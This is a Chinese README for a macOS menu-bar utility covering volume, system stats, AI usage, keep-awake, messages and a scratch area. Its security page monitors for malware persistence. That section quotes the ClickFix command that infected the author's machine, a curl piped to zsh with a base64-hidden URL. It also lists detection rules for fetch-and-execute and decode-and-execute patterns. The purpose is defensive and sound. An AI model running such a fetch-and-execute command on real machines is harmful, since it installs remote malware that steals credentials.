# 一览

macOS 菜单栏小工具：分应用音量控制 + 系统状态（CPU / 内存 / 磁盘 / 网络 / 电池与实时功率）+ AI 用量（Claude、Codex、Grok Bot）+ 保持唤醒（类似 Amphetamine）+ 消息（微信 / QQ 等未读数与快捷入口）+ 素材（临时截图 / 文件夹，原「素材夹」）+ 安全（盯恶意脚本和后门）。

- 左键：弹出面板（音量 / 状态 / AI / 消息 / 素材 / 安全 六页，⌘1–⌘6 切换）
- 拖到菜单栏图标上：文件或图片直接放进素材页
- Option + 左键：一键开关「保持唤醒」（无限期），开启时菜单栏最左侧显示咖啡杯
- 右键：选择菜单栏显示项、保持唤醒时长（15 分钟～8 小时 / 无限期，可选允许屏幕关闭、合盖也保持唤醒）、素材（从剪贴板添加、在访达中打开、清空、自动收集新截图、收集复制的图片和文件、自动清理天数）、登录时启动、退出

状态页：「占用最高」看板列出 CPU 或内存占用最高的 5 个应用（辅助进程算在所属应用名下；只统计当前用户的进程，WindowServer 这类系统进程不在内），点标题可收起，收起后不再采样。

消息页：未读数取自各应用的程序坞角标（需在「系统设置 › 通知」中为其打开「标记」），无需额外权限；「原生菜单」按钮点按该应用自己的菜单栏图标，需要辅助功能权限。菜单栏「消息未读」项只在有未读时出现。

素材页：拖进面板 / 拖到菜单栏图标 / ⌘V 粘贴剪贴板图片 / 自动收集新截图（默认开）/ 自动收集复制的图片和文件（默认开）。截图设成「存到剪贴板」时不落文件，靠后者收进来；复制的文件只收 200 MB 以内的单个文件（文件夹不收），纯文本不收，密码管理器标记为隐藏的剪贴板内容跳过。素材按天自动清理：默认保留 1 天，可选 3 / 7 / 30 天、自定义天数或不清理（素材页右上角或右键菜单里改），过期的移到废纸篓，按加入时间算。缩略图右下角标注格式，可直接拖出到任意应用；双击打开；右键拷贝、在访达中显示、移出。存的是副本，放在 `~/Library/Application Support/素材夹/`（沿用原素材夹的目录，旧素材自动带过来；移出的项进废纸篓）。

安全页：起因是 2026-11 发现本机被 ClickFix 类木马（AMOS 一系）潜伏了 8 个月——终端里粘贴过 `curl -sfkSL $(echo '<base64>'|base64 -D) | zsh`，之后它装了两个 root 的 LaunchDaemon，一个跑主目录里的隐藏文件，一个冒充 `com.apple.*`。监控对着这套手法来：

- 启动项（实时监听 `~/Library/LaunchAgents`、`/Library/LaunchAgents`、`/Library/LaunchDaemons`，另每分钟查 cron、`/etc/sudoers.d`、配置描述文件、`~/.zshrc` 等启动文件）。高危：名字冒充苹果、root 跑用户目录里的程序、程序在临时目录/共享目录/主目录隐藏文件、启动参数里直接下载或解码执行；其余新出现的项算「新增」提醒一次。
- 进程（每 3 秒，只细看新进程）：root 跑用户目录里的程序、藏在上述位置的后台常驻程序、未签名的 launchd 常驻程序、`osascript` 隐藏输入框（AMOS 骗登录密码的弹窗）、`curl`/`wget` 的输出正被管道给 shell（按管道句柄比对，脚本里普通下载不算）。
- 终端命令历史：base64 解码后执行、`curl -k` 管道给 shell、从裸 IP 或不认识的网站拿脚本直接执行（claude.ai、brew、rustup 等常见安装脚本不报）。base64 里藏的网址会解码出来显示。zsh 默认关窗口才写历史，页面上「改为即时」会在 `~/.zshrc` 加 `setopt INC_APPEND_HISTORY`。
- 系统：SIP、Gatekeeper、FileVault、防火墙。

首次运行把已有的非高危项记为已知（基线），高危项不进基线。发现问题时发系统通知、菜单栏最左边出现盾牌，点图标直接到安全页。每项可「停用并隔离」（`launchctl bootout` 后把 plist 和可疑程序移到 `~/Library/Application Support/一览/隔离区/<时间>/`，附「来源.txt」写明原位置和放回方法，不删除；系统级要管理员密码）、「结束进程」、「信任」（内容一变会重新提醒）、「知道了」。脚本里可发分布式通知 `com.evens.yilan.openSecurity` 打开安全页。

做不到的：没有 Endpoint Security 权限，看不到存活不到 3 秒的进程，也拦不住执行，只能事后发现；`curl | zsh` 这种秒级命令主要靠它留下的启动项和命令历史抓。

## 构建

```bash
./build.sh --install
```

只构建不安装就去掉 `--install`。图标由 `Icon/make_icon.swift` 用代码画出（「一」字横条是菜单栏，下面挂着的面板里三条读数，一眼看全），改了以后运行 `Icon/make_icon.sh` 重新生成 `AppIcon.icns`。脚本会用钥匙串里的 Apple Development 证书签名（没有就退回 ad-hoc），这样重新构建后音频捕获、辅助功能、桌面访问这些授权都还在；ad-hoc 签名每次构建都要重新授权。`--install` 会正常退出正在运行的一览（保持唤醒和音频接管会收尾），换上新包再打开。

需要 macOS 14.2+、Swift 5.9+。Claude 套餐百分比读取钥匙串中 Claude Code 的登录；令牌过期时运行 `claude auth status`，由官方 CLI 自己刷新，本应用不直接刷新。

Grok Bot 用量：在 AI 页登录一次，令牌存入钥匙串的「一览.grok」，与 Grok Bot 应用的登录互不影响。Grok Bot 没有公开的用量 API，这里用的是其私有接口，可能随时失效。

合盖保持唤醒：首次开启时输入一次管理员密码，安装 `/etc/sudoers.d/yilan-pmset`（只允许当前用户免密执行 `pmset -a disablesleep 0/1`）。会话结束、退出或下次启动（崩溃恢复）时自动关回；用电池且电量低于 15% 自动停止。右键菜单「移除合盖辅助…」可卸载。
